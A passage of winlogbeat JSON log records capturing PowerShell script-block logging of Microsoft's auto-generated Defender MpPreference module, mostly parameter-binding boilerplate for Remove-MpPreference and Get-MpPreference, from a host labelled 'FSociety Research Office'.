$__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ExclusionExtension')) {\n          [object]$__cmdletization_value = ${ExclusionExtension}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ExclusionProcess')) {\n          [object]$__cmdletization_value = ${ExclusionProcess}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ExclusionIpAddress')) {\n          [object]$__cmdletization_value = ${ExclusionIpAddress}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value "}
{"timestamp":"2021-09-15T16:35:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Execute a Remote Command","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":"n_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('TrustLabelProtectionStatus')) {\n          [object]$__cmdletization_value = ${TrustLabelProtectionStatus}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TrustLabelProtectionStatus'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TrustLabelProtectionStatus'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('Force')) {\n          [object]$__cmdletization_value = ${Force}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Remove', $__cmdletization_methodParameters, $__cmdletization_returnValue)\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\n\n            }\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n        \n\n    End {\n        try\n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n                $__cmdletization_objectModelWrapper.EndProcessing()\n            }\n        }\n        catch\n        {\n            throw\n        }\n    }\n\n    # .EXTERNALHELP MSFT_MpPreference.cdxml-Help.xml\n}\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Remove-MpPreference' -Alias '*'\n        \n\nfunction Get-MpPreference\n{\n    [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)]\n    \n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]\n[OutputType('Microsoft.Management.Infrastructure.CimInstance#root\\Microsoft\\Windows\\Defender\\MSFT_MpPreference')]\n\n    param(\n    \n    [Alias('Session')]\n    [ValidateNotNullOrEmpty()]\n    [CimSession[]]\n    ${CimSession},\n\n    [int]\n    ${ThrottleLimit},\n\n    [switch]\n    ${AsJob})\n\n    DynamicParam {\n        try \n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\n\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\n                {\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\n                }\n            }\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n\n    Begin {\n        $__cmdletization_exceptionHasBeenThrown = $false\n        try \n        {\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\n            $__cmdletization_objectModelWrapper.BeginProcessing()\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n        \n\n    Process {\n        try \n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()\n\n\n    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)\n            }\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n        \n\n    End {\n        try\n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n                $__cmdletization_objectModelWrapper.EndProcessing()\n            }\n        }\n        catch\n        {\n            throw\n        }\n    }\n\n    # .EXTERNALHELP MSFT_MpPreference.cdxml-Help.xml\n}\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Get-MpPreference' -Alias '*'\n        "}
{"timestamp":"2021-09-15T16:35:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Execute a Remote Command","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":"e = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ControlledFolderAccessAllowedApplications')) {\n          [object]$__cmdletization_value = ${ControlledFolderAccessAllowedApplications}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ControlledFolderAccessProtectedFolders')) {\n          [object]$__cmdletization_value = ${ControlledFolderAccessProtectedFolders}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Ids')) {\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Ids}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Actions')) {\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Actions}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('EnableLowCpuPriority')) {\n          [object]$__cmdletization_value = ${EnableLowCpuPriority}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableLowCpuPriority'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableLowCpuPriority'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('EnableFileHashComputation')) {\n          [object]$__cmdletization_value = ${EnableFileHashComputation}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFileHashComputation'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFileHashComputation'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('EnableFullScanOnBatteryPower')) {\n          [object]$__cmdletization_value = ${EnableFullScanOnBatteryPower}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFullScanOnBatteryPower'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFullScanOnBatteryPower'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ProxyPacUrl')) {\n          [object]$__cmdletization_value = ${ProxyPacUrl}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyPacUrl'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyPacUrl'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ProxyServer')) {\n          [object]$__cmdletization_value = ${ProxyServer}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ProxyBypass')) {\n          [object]$__cmdletization_value = ${ProxyBypass}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyBypass'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyBypass'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ForceUseProxyOnly')) {\n          [object]$__cmdletization_value = ${ForceUseProxyOnly}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ForceUseProxyOnly'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ForceUseProxyOnly'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableTlsParsing')) {\n          [object]$__cmdletization_value = ${DisableTlsParsing}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTlsParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTlsParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableHttpParsing')) {\n          [object]$__cmdletization_value = ${DisableHttpParsing}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableHttpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableHttpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In';"}
{"timestamp":"2021-09-15T16:35:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Execute a Remote Command","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":"[object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableIntrusionPreventionSystem')) {\n          [object]$__cmdletization_value = ${DisableIntrusionPreventionSystem}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIntrusionPreventionSystem'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIntrusionPreventionSystem'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableIOAVProtection')) {\n          [object]$__cmdletization_value = ${DisableIOAVProtection}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIOAVProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIOAVProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableRealtimeMonitoring')) {\n          [object]$__cmdletization_value = ${DisableRealtimeMonitoring}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRealtimeMonitoring'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRealtimeMonitoring'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableScriptScanning')) {\n          [object]$__cmdletization_value = ${DisableScriptScanning}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScriptScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScriptScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableArchiveScanning')) {\n          [object]$__cmdletization_value = ${DisableArchiveScanning}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableArchiveScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableArchiveScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableCatchupFullScan')) {\n          [object]$__cmdletization_value = ${DisableCatchupFullScan}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupFullScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupFullScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableCatchupQuickScan')) {\n          [object]$__cmdletization_value = ${DisableCatchupQuickScan}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupQuickScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupQuickScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableEmailScanning')) {\n          [object]$__cmdletization_value = ${DisableEmailScanning}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableEmailScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableEmailScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableRemovableDriveScanning')) {\n          [object]$__cmdletization_value = ${DisableRemovableDriveScanning}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRemovableDriveScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRemovableDriveScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableRestorePoint')) {\n          [object]$__cmdletization_value = ${DisableRestorePoint}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRestorePoint'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRestorePoint'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableScanningMappedNetworkDrivesForFullScan')) {\n          [object]$__cmdletization_value = ${DisableScanningMappedNetworkDrivesForFullScan}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningMappedNetworkDrivesForFullScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningMappedNetworkDrivesForFullScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableScanningNetworkFiles')) {\n          [object]$__cmdletization_value = ${DisableScanningNetworkFiles}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningNetworkFiles'; ParameterType = 